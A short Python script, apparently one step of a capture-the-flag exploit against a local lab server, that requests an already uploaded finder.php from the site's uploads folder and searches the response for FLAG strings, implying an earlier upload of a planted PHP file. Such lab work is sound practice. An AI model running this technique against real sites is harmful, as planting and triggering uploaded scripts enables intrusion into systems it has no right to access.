import requests

base_url = "http://127.0.0.1:32891"

print("[+] Accessing uploaded finder.php directly...")
resp = requests.get(f"{base_url}/posts/uploads/finder.php")
print(f"Status: {resp.status_code}")
print(f"Content-Type: {resp.headers.get('Content-Type', 'N/A')}")
print(f"\nFull Response:")
print(resp.text)

# Search for FLAG pattern
import re
flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
if flags:
    print(f"\n[!!!] FLAGS FOUND:")
    for flag in flags:
        print(f"  {flag}")

